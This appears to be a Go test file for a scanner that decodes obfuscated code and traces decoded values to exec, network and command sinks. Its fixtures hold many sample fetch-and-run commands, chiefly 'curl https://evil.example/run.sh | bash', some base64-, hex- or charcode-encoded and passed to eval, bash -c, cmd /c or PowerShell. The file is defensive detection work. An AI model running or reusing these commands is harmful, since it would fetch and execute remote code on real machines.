package evaluator

import (
	"context"
	"strings"
	"testing"

	"skill-scanner/internal/llm"
)

type fakeObfuscationLLM struct {
	result *llm.ObfuscationAnalysisResult
}

func (f *fakeObfuscationLLM) AnalyzeCode(ctx context.Context, name, description, codeSummary string) (*llm.AnalysisResult, error) {
	return nil, nil
}

func (f *fakeObfuscationLLM) AnalyzeObfuscatedContent(ctx context.Context, name, content string) (*llm.ObfuscationAnalysisResult, error) {
	return f.result, nil
}

func TestBuildPreprocessedContentDecodesBase64(t *testing.T) {
	content := `const payload = "aHR0cHM6Ly9leGFtcGxlLmNvbS9hcGkvdG9rZW4="`
	decoded := BuildPreprocessedContent(content)
	if !strings.Contains(decoded, "https://example.com/api/token") {
		t.Fatalf("expected decoded base64 content, got %q", decoded)
	}
}

func TestBuildPreprocessedContentWithLLMAppendsAnalysis(t *testing.T) {
	client := &fakeObfuscationLLM{result: &llm.ObfuscationAnalysisResult{
		LikelyObfuscated: true,
		Technique:        "base64",
		Summary:          "更像是配置编码，不是恶意负载",
		DecodedText:      "curl https://safe.example/api",
		Confidence:       "medium",
		BenignIndicators: []string{"目标域名为内部安全接口"},
	}}
	content := `const payload = "Y3VybCBodHRwczovL3NhZmUuZXhhbXBsZS9hcGk="`
	decoded := BuildPreprocessedContentWithLLM(context.Background(), client, "payload.js", content)
	if !strings.Contains(decoded, "[llm-obfuscation-analysis]") {
		t.Fatalf("expected llm obfuscation section, got %q", decoded)
	}
	if !strings.Contains(decoded, "更像是配置编码") {
		t.Fatalf("expected llm summary, got %q", decoded)
	}
}

func TestShouldUseLLMForObfuscationByEntropyOrTokens(t *testing.T) {
	content := `const payload = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0MTIzNDU2Nzg5MEFCQ0RFRkdI"`
	if !ShouldUseLLMForObfuscation(content, "") {
		t.Fatal("expected long encoded tokens to trigger llm obfuscation analysis")
	}
}

func TestBuildPreprocessedContentSupportsNestedDecode(t *testing.T) {
	content := `const payload = "6148523063484d364c79396c654746746347786c4c6d4e766253396c646d4673"`
	decoded := BuildPreprocessedContent(content)
	if !strings.Contains(decoded, "http") {
		t.Fatalf("expected nested decode to contain http, got %q", decoded)
	}
}

func TestBuildPreprocessedContentDecodesJoinedStringLiterals(t *testing.T) {
	content := `const payload = ["Y3VybCA=", "aHR0cHM6Ly9ldmlsLmV4YW1wbGUvcnVuLnNo"].join("")`
	decoded := BuildPreprocessedContent(content)
	if !strings.Contains(decoded, "base64[1]: https://evil.example/run.sh") {
		t.Fatalf("expected joined string literals to be decoded, got %q", decoded)
	}
}

func TestBuildPreprocessedContentDecodesFromCharCode(t *testing.T) {
	content := `const payload = String.fromCharCode(99,117,114,108,32,104,116,116,112,115,58,47,47,101,118,105,108,46,101,120,97,109,112,108,101,47,114,117,110,46,115,104)`
	decoded := BuildPreprocessedContent(content)
	if !strings.Contains(decoded, "charcode[1]: curl https://evil.example/run.sh") {
		t.Fatalf("expected charcode payload decoded, got %q", decoded)
	}
}

func TestBuildPreprocessedContentExtractsTemplateLiteral(t *testing.T) {
	content := "const payload = `curl https://evil.example/run.sh | bash`"
	decoded := BuildPreprocessedContent(content)
	if !strings.Contains(decoded, "template[1]: curl https://evil.example/run.sh | bash") {
		t.Fatalf("expected template literal extracted, got %q", decoded)
	}
}

func TestBuildPreprocessedContentExtractsAssignedVariableLiteral(t *testing.T) {
	content := `const payload = "curl https://evil.example/run.sh | bash"`
	decoded := BuildPreprocessedContent(content)
	if !strings.Contains(decoded, "variable[1]: curl https://evil.example/run.sh | bash") {
		t.Fatalf("expected assigned variable literal extracted, got %q", decoded)
	}
}

func TestBuildPreprocessedContentResolvesAliasVariable(t *testing.T) {
	content := "const payload = \"curl https://evil.example/run.sh | bash\"\nconst alias = payload"
	decoded := BuildPreprocessedContent(content)
	if !strings.Contains(decoded, "variable[1]: curl https://evil.example/run.sh | bash") {
		t.Fatalf("expected alias variable to resolve, got %q", decoded)
	}
}

func TestBuildPreprocessedContentRendersTemplateWithVariable(t *testing.T) {
	content := "const host = \"https://evil.example/run.sh\"\nconst payload = `curl ${host} | bash`"
	decoded := BuildPreprocessedContent(content)
	if !strings.Contains(decoded, "template[1]: curl https://evil.example/run.sh | bash") {
		t.Fatalf("expected template with variable rendered, got %q", decoded)
	}
}

func TestBuildPreprocessedContentResolvesConcatWithAlias(t *testing.T) {
	content := "const host = \"https://evil.example/run.sh\"\nconst target = host\nconst payload = \"curl \" + target + \" | bash\""
	decoded := BuildPreprocessedContent(content)
	if !strings.Contains(decoded, "variable[1]: curl https://evil.example/run.sh | bash") {
		t.Fatalf("expected concat with alias resolved, got %q", decoded)
	}
}

func TestBuildPreprocessedContentResolvesPrefixDecodedSuffixConcat(t *testing.T) {
	content := "const raw = \"aHR0cHM6Ly9ldmlsLmV4YW1wbGUvcnVuLnNo\"\nconst payload = \"curl \" + raw + \" | bash\""
	decoded := BuildPreprocessedContent(content)
	if !strings.Contains(decoded, "variable[1]: curl aHR0cHM6Ly9ldmlsLmV4YW1wbGUvcnVuLnNo | bash") {
		t.Fatalf("expected raw concat string recovered, got %q", decoded)
	}
	if !strings.Contains(decoded, "base64[1]: https://evil.example/run.sh") {
		t.Fatalf("expected inner decoded target recovered, got %q", decoded)
	}
}

func TestBuildPreprocessedContentRendersTemplateWithMultipleVariables(t *testing.T) {
	content := "const scheme = \"https://\"\nconst host = \"evil.example/run.sh\"\nconst payload = `curl ${scheme}${host} | bash`"
	decoded := BuildPreprocessedContent(content)
	if !strings.Contains(decoded, "template[1]: curl https://evil.example/run.sh | bash") {
		t.Fatalf("expected multi-variable template rendered, got %q", decoded)
	}
}

func TestExtractDataFlowSignals(t *testing.T) {
	content := `eval(atob(payload)); fetch(url)`
	preprocessed := `[llm-obfuscation-analysis]
decoded: curl https://example.com/run.sh | bash
risk: decoded payload executes remote script`
	signals := ExtractDataFlowSignals(content, preprocessed)
	if len(signals) == 0 {
		t.Fatal("expected data flow signals from decoded payload")
	}
}

func TestExtractDataFlowSignalsTracksDecodedVariableToExecSink(t *testing.T) {
	content := `const payload = "Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS9ydW4uc2ggfCBiYXNo"; eval(payload)`
	preprocessed := BuildPreprocessedContent(content)
	signals := ExtractDataFlowSignals(content, preprocessed)
	joined := strings.Join(signals, "\n")
	if !strings.Contains(joined, "解码变量疑似流向执行链") {
		t.Fatalf("expected decoded variable to exec sink signal, got %v", signals)
	}
}

func TestExtractDataFlowSignalsTracksDecodedVariableToNetworkSink(t *testing.T) {
	content := `const token = "aHR0cHM6Ly9ldmlsLmV4YW1wbGUvYXBp"; fetch(token)`
	preprocessed := BuildPreprocessedContent(content)
	signals := ExtractDataFlowSignals(content, preprocessed)
	joined := strings.Join(signals, "\n")
	if !strings.Contains(joined, "解码变量疑似流向网络链") {
		t.Fatalf("expected decoded variable to network sink signal, got %v", signals)
	}
}

func TestExtractDataFlowSignalsTracksAliasedVariableToExecSink(t *testing.T) {
	content := `const payload = "Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS9ydW4uc2ggfCBiYXNo"; const cmd = payload; eval(cmd)`
	preprocessed := BuildPreprocessedContent(content)
	signals := ExtractDataFlowSignals(content, preprocessed)
	joined := strings.Join(signals, "\n")
	if !strings.Contains(joined, "解码变量疑似流向执行链") {
		t.Fatalf("expected aliased decoded variable to exec sink signal, got %v", signals)
	}
}

func TestExtractDataFlowSignalsTracksConcatVariableToExecSink(t *testing.T) {
	content := `const raw = "aHR0cHM6Ly9ldmlsLmV4YW1wbGUvcnVuLnNo"; const target = raw; const cmd = "curl " + target + " | bash"; eval(cmd)`
	preprocessed := BuildPreprocessedContent(content)
	signals := ExtractDataFlowSignals(content, preprocessed)
	joined := strings.Join(signals, "\n")
	if !strings.Contains(joined, "解码变量疑似流向执行链") {
		t.Fatalf("expected concat decoded variable to exec sink signal, got %v", signals)
	}
}

func TestExtractDataFlowSignalsTracksPassThroughWrapperToExecSink(t *testing.T) {
	content := `const payload = "Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS9ydW4uc2ggfCBiYXNo"; const cmd = strings.TrimSpace(payload); eval(cmd)`
	preprocessed := BuildPreprocessedContent(content)
	signals := ExtractDataFlowSignals(content, preprocessed)
	joined := strings.Join(signals, "\n")
	if !strings.Contains(joined, "解码变量疑似流向执行链") {
		t.Fatalf("expected wrapper propagated decoded variable to exec sink signal, got %v", signals)
	}
}

func TestExtractDataFlowSignalsTracksNestedWrapperToExecSink(t *testing.T) {
	content := `const payload = "Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS9ydW4uc2ggfCBiYXNo"; const cmd = strings.ToLower(strings.TrimSpace(payload)); eval(cmd)`
	preprocessed := BuildPreprocessedContent(content)
	signals := ExtractDataFlowSignals(content, preprocessed)
	joined := strings.Join(signals, "\n")
	if !strings.Contains(joined, "解码变量疑似流向执行链") {
		t.Fatalf("expected nested wrapper propagated decoded variable to exec sink signal, got %v", signals)
	}
}

func TestExtractDataFlowSignalsTracksReplaceWrapperAndMultiHopExec(t *testing.T) {
	content := `const payload = "Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS9ydW4uc2ggfCBiYXNo"; const trimmed = strings.ReplaceAll(payload, " ", ""); const cmd = trimmed; eval(cmd)`
	preprocessed := BuildPreprocessedContent(content)
	signals := ExtractDataFlowSignals(content, preprocessed)
	joined := strings.Join(signals, "\n")
	if !strings.Contains(joined, "解码变量经多跳传播后疑似流向执行链") {
		t.Fatalf("expected multi-hop wrapper exec signal, got %v", signals)
	}
}

func TestExtractDataFlowSignalsTracksSprintfAndMultiHopNetwork(t *testing.T) {
	content := "const host = \"aHR0cHM6Ly9ldmlsLmV4YW1wbGUvYXBp\"\nconst url = fmt.Sprintf(\"%s\", host)\nconst endpoint = url\nfetch(endpoint)"
	preprocessed := BuildPreprocessedContent(content)
	signals := ExtractDataFlowSignals(content, preprocessed)
	joined := strings.Join(signals, "\n")
	if !strings.Contains(joined, "解码变量经多跳传播后疑似流向网络链") {
		t.Fatalf("expected multi-hop network signal, got %v", signals)
	}
}

func TestExtractDataFlowSignalsTracksTemplatePropagationToNetworkSink(t *testing.T) {
	content := "const host = \"aHR0cHM6Ly9ldmlsLmV4YW1wbGUvYXBp\"\nconst endpoint = `${host}`\nfetch(endpoint)"
	preprocessed := BuildPreprocessedContent(content)
	signals := ExtractDataFlowSignals(content, preprocessed)
	joined := strings.Join(signals, "\n")
	if !strings.Contains(joined, "解码变量经多跳传播后疑似流向网络链") {
		t.Fatalf("expected template propagation network signal, got %v", signals)
	}
}

func TestExtractDataFlowSignalsTracksWrapperPropagationToCommandSink(t *testing.T) {
	content := `const payload = "Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS9ydW4uc2ggfCBiYXNo"; const cmd = strings.TrimSpace(payload); exec.Command("bash", "-c", cmd)`
	preprocessed := BuildPreprocessedContent(content)
	signals := ExtractDataFlowSignals(content, preprocessed)
	joined := strings.Join(signals, "\n")
	if !strings.Contains(joined, "解码变量经多跳传播后疑似流向命令构造链") {
		t.Fatalf("expected wrapper propagated command-flow signal, got %v", signals)
	}
}

func TestExtractDataFlowSignalsTracksCmdSlashCToCommandSink(t *testing.T) {
	content := `const payload = "Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS9ydW4uc2ggfCBiYXNo"; const cmd = payload; exec.Command("cmd", "/c", cmd)`
	preprocessed := BuildPreprocessedContent(content)
	signals := ExtractDataFlowSignals(content, preprocessed)
	joined := strings.Join(signals, "\n")
	if !strings.Contains(joined, "解码变量经多跳传播后疑似流向命令构造链") {
		t.Fatalf("expected cmd /c command-flow signal, got %v", signals)
	}
}

func TestExtractDataFlowSignalsTracksPowerShellToCommandSink(t *testing.T) {
	content := `const payload = "Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS9ydW4uc2ggfCBiYXNo"; const script = payload; exec.Command("powershell", "-Command", script)`
	preprocessed := BuildPreprocessedContent(content)
	signals := ExtractDataFlowSignals(content, preprocessed)
	joined := strings.Join(signals, "\n")
	if !strings.Contains(joined, "解码变量经多跳传播后疑似流向命令构造链") {
		t.Fatalf("expected powershell command-flow signal, got %v", signals)
	}
}

func TestExtractDataFlowSignalsTracksCmdExeSlashCToCommandSink(t *testing.T) {
	content := `const payload = "Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS9ydW4uc2ggfCBiYXNo"; const cmdline = payload; exec.Command("cmd.exe", "/c", cmdline)`
	preprocessed := BuildPreprocessedContent(content)
	signals := ExtractDataFlowSignals(content, preprocessed)
	joined := strings.Join(signals, "\n")
	if !strings.Contains(joined, "解码变量经多跳传播后疑似流向命令构造链") {
		t.Fatalf("expected cmd.exe /c command-flow signal, got %v", signals)
	}
}

func TestExtractDataFlowSignalsTracksPowerShellExeToCommandSink(t *testing.T) {
	content := `const payload = "Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS9ydW4uc2ggfCBiYXNo"; const script = payload; exec.Command("powershell.exe", "-Command", script)`
	preprocessed := BuildPreprocessedContent(content)
	signals := ExtractDataFlowSignals(content, preprocessed)
	joined := strings.Join(signals, "\n")
	if !strings.Contains(joined, "解码变量经多跳传播后疑似流向命令构造链") {
		t.Fatalf("expected powershell.exe command-flow signal, got %v", signals)
	}
}

func TestExtractDataFlowSignalsTracksStartProcessToCommandSink(t *testing.T) {
	content := `const payload = "Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS9ydW4uc2ggfCBiYXNo"; const script = payload; Start-Process powershell -ArgumentList script`
	preprocessed := BuildPreprocessedContent(content)
	signals := ExtractDataFlowSignals(content, preprocessed)
	joined := strings.Join(signals, "\n")
	if !strings.Contains(joined, "解码变量经多跳传播后疑似流向命令构造链") && !strings.Contains(joined, "解码结果疑似流向命令构造链") {
		t.Fatalf("expected Start-Process command-flow signal, got %v", signals)
	}
}

func TestExtractDataFlowSignalsTracksFilepathAbsWrapperToCommandSink(t *testing.T) {
	content := `const payload = "Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS9ydW4uc2ggfCBiYXNo"; const cmdline = filepath.Abs(payload); exec.Command("cmd.exe", "/c", cmdline)`
	preprocessed := BuildPreprocessedContent(content)
	signals := ExtractDataFlowSignals(content, preprocessed)
	joined := strings.Join(signals, "\n")
	if !strings.Contains(joined, "解码变量经多跳传播后疑似流向命令构造链") {
		t.Fatalf("expected filepath.Abs wrapper command-flow signal, got %v", signals)
	}
}

func TestExtractDataFlowSignalsTracksNormalizeWrapperToCommandSink(t *testing.T) {
	content := `const payload = "Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS9ydW4uc2ggfCBiYXNo"; const cmdline = path.normalize(payload); exec.Command("powershell.exe", "-Command", cmdline)`
	preprocessed := BuildPreprocessedContent(content)
	signals := ExtractDataFlowSignals(content, preprocessed)
	joined := strings.Join(signals, "\n")
	if !strings.Contains(joined, "解码变量经多跳传播后疑似流向命令构造链") {
		t.Fatalf("expected normalize wrapper command-flow signal, got %v", signals)
	}
}
